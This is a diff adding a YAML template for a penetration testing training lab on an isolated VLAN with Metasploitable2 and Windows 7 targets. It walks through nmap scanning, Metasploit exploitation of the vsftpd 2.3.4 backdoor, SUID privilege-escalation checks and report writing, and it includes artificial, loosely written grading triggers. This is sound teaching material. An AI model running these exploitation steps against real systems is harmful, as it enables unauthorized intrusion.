@@ -1,0 +1,308 @@
+apiVersion: v1
+kind: LabTemplate
+metadata:
+  name: Penetration Testing Basics
+  description: |
+    Learn the fundamentals of penetration testing methodology. This lab covers
+    reconnaissance, scanning, exploitation using Metasploit, post-exploitation,
+    and professional report writing following the PTES framework.
+  duration: 180m
+  difficulty: intermediate
+  tags:
+    - security
+    - pentesting
+    - metasploit
+    - exploitation
+    - red-team
+  version: "1.0.0"
+  author: Kootenai Team
+  category: cybersecurity
+  instructions:
+    overview: |
+      Penetration testing is the authorized simulation of real-world attacks to find security
+      weaknesses before adversaries do. This lab follows the PTES (Penetration Testing
+      Execution Standard) methodology: reconnaissance, scanning, exploitation with Metasploit,
+      post-exploitation, and professional report writing.
+    learning_objectives:
+      - Perform passive and active reconnaissance
+      - Scan targets and identify exploitable vulnerabilities
+      - Exploit vulnerabilities using Metasploit Framework
+      - Obtain remote shell access on target systems
+      - Escalate privileges to root/administrator
+      - Write professional penetration test reports
+    prerequisites:
+      - Networking fundamentals (TCP/IP, ports, protocols)
+      - Linux command line proficiency
+      - Completion of Vulnerability Assessment recommended
+    steps:
+      - id: passive-recon
+        title: Passive Reconnaissance
+        content: |
+          Gather information without directly touching the target.
+
+          ```bash
+          # DNS lookups
+          dig 10.25.0.100
+          whois 10.25.0.100
+
+          # Document reconnaissance findings
+          mkdir -p ~/lab
+          echo "Target: 10.25.0.100 (Linux)" > ~/lab/recon.txt
+          echo "Target: 10.25.0.101 (Windows)" >> ~/lab/recon.txt
+          ```
+      - id: active-scan
+        title: Active Scanning with Nmap
+        content: |
+          Actively probe the targets for open ports and services.
+
+          ```bash
+          # Comprehensive scan of Linux target
+          nmap -sV -sC -O 10.25.0.100 -oN ~/lab/linux_scan.txt
+
+          # Comprehensive scan of Windows target
+          nmap -sV -sC -O 10.25.0.101 -oN ~/lab/windows_scan.txt
+          ```
+      - id: identify-vulns
+        title: Identify Exploitable Vulnerabilities
+        content: |
+          Analyze scan results to find exploitable services.
+
+          ```bash
+          # Look for known vulnerable service versions
+          grep "open" ~/lab/linux_scan.txt
+
+          # Search for exploits
+          searchsploit apache 2.4
+          searchsploit vsftpd
+
+          # Document findings
+          echo "Exploitable: vsftpd 2.3.4 backdoor exploit" > ~/lab/vulns_found.txt
+          ```
+      - id: metasploit
+        title: Exploit with Metasploit
+        content: |
+          Use Metasploit to exploit a discovered vulnerability.
+
+          ```bash
+          msfconsole -q
+
+          # In Metasploit:
+          # search vsftpd
+          # use exploit/unix/ftp/vsftpd_234_backdoor
+          # set RHOSTS 10.25.0.100
+          # exploit
+          ```
+      - id: get-shell
+        title: Obtain Shell Access
+        content: |
+          Verify you have command execution on the target.
+
+          ```bash
+          # After successful exploitation, in the shell:
+          whoami
+          id
+          hostname
+          uname -a
+
+          # Document shell access
+          echo "Shell obtained as: $(whoami)" > ~/lab/shell_access.txt
+          ```
+      - id: privesc
+        title: Privilege Escalation
+        content: |
+          Escalate from a limited user to root/administrator.
+
+          ```bash
+          # Check for SUID binaries
+          find / -perm -4000 -type f 2>/dev/null
+
+          # Check sudo permissions
+          sudo -l
+
+          # Check kernel version for known exploits
+          uname -r
+
+          # After successful escalation
+          echo "Escalated to root via [method]" > ~/lab/privesc_success.txt
+          ```
+      - id: report
+        title: Write the Penetration Test Report
+        content: |
+          Document everything in a professional report.
+
+          ```bash
+          cat > ~/lab/pentest_report.md << 'EOF'
+          # Penetration Test Report
+
+          ## Scope
+          - Targets: 10.25.0.100, 10.25.0.101
+          - Methodology: PTES
+
+          ## Findings
+          ### Critical: vsftpd Backdoor (10.25.0.100)
+          - Service: vsftpd 2.3.4 on port 21
+          - Impact: Remote root shell
+          - Remediation: Update vsftpd immediately
+
+          ### High: Privilege Escalation via SUID
+          - Impact: Local user to root
+          - Remediation: Audit and remove unnecessary SUID binaries
+          EOF
+          ```
+    summary: |
+      You've completed a full penetration test: reconnaissance, scanning, exploitation
+      with Metasploit, privilege escalation, and professional report writing.
+    tips:
+      - Always have written authorization (Rules of Engagement) before testing
+      - Document every step for reproducibility
+      - Try the least intrusive approach first
+      - "A good report is more valuable than a successful exploit"
+
+spec:
+  platform: proxmox
+
+  network:
+    segments:
+      - name: pentest-network
+        vlan: 205
+        subnet: 10.25.0.0/24
+        gateway: 10.25.0.1
+        dhcp: false
+
+  vms:
+    - name: kali-attacker
+      template: kali-linux
+      wazuhAgent: true
+      agentConfig:
+        monitor_paths:
+          - /home/kali
+          - /var/log
+        audit_commands: true
+        realtime: true
+      resources:
+        cpu: 2
+        memory: 4096
+        disk: 60
+      networks:
+        - segment: pentest-network
+          ip: 10.25.0.10
+      snapshots:
+        - name: initial
+          description: Kali with Metasploit and pentesting tools
+          default: true
+
+    - name: target-linux
+      template: metasploitable2
+      resources:
+        cpu: 1
+        memory: 1024
+        disk: 20
+      networks:
+        - segment: pentest-network
+          ip: 10.25.0.100
+      snapshots:
+        - name: vulnerable
+          description: Metasploitable 2 vulnerable target
+          default: true
+
+    - name: target-windows
+      template: windows-7-vulnerable
+      resources:
+        cpu: 2
+        memory: 2048
+        disk: 40
+      networks:
+        - segment: pentest-network
+          ip: 10.25.0.101
+      snapshots:
+        - name: vulnerable
+          description: Windows 7 with unpatched vulnerabilities
+          default: true
+
+  checkpoints:
+    enabled: true
+    pass_threshold: 70
+    allow_retry: true
+    show_hints: true
+    realtime_update: true
+
+  objectives:
+    - id: passive-recon
+      description: Gather information about targets without active scanning
+      points: 10
+      hint: "Use whois, dig, and OSINT techniques"
+      order: 1
+      triggers:
+        - type: command_executed
+          target: kali-attacker
+          match:
+            pattern: "whois|dig|theHarvester"
+
+    - id: active-scan
+      description: Perform active reconnaissance with Nmap
+      points: 15
+      hint: "Use nmap with -sV -sC for comprehensive scanning"
+      order: 2
+      triggers:
+        - type: command_executed
+          target: kali-attacker
+          match:
+            pattern: "nmap.*10.25.0"
+
+    - id: vulnerability-identify
+      description: Identify an exploitable vulnerability on the Linux target
+      points: 15
+      hint: "Look for outdated services with known exploits"
+      order: 3
+      triggers:
+        - type: file_content
+          target: kali-attacker
+          match:
+            path: /home/kali/lab/vulns_found.txt
+            contains: "exploit"
+
+    - id: metasploit-exploit
+      description: Successfully exploit a vulnerability using Metasploit
+      points: 25
+      hint: "Use msfconsole, search for exploit, set options, and run"
+      order: 4
+      triggers:
+        - type: command_executed
+          target: kali-attacker
+          match:
+            pattern: "msfconsole|msf.*exploit"
+
+    - id: get-shell
+      description: Obtain a shell on the target system
+      points: 20
+      hint: "After successful exploitation, you should have command execution"
+      order: 5
+      triggers:
+        - type: file_content
+          target: kali-attacker
+          match:
+            path: /home/kali/lab/shell_access.txt
+            contains: "whoami"
+
+    - id: privilege-escalation
+      description: Escalate privileges to root/administrator
+      points: 20
+      hint: "Look for SUID binaries, kernel exploits, or misconfigurations"
+      order: 6
+      triggers:
+        - type: file_content
+          target: kali-attacker
+          match:
+            path: /home/kali/lab/privesc_success.txt
+            contains: "root"
+
+    - id: pentest-report
+      description: Write a professional penetration test report
+      points: 15
+      hint: "Include methodology, findings, evidence, and recommendations"
+      order: 7
+      triggers:
+        - type: file_exists
+          target: kali-attacker
+          match:
+            path: /home/kali/lab/pentest_report.md
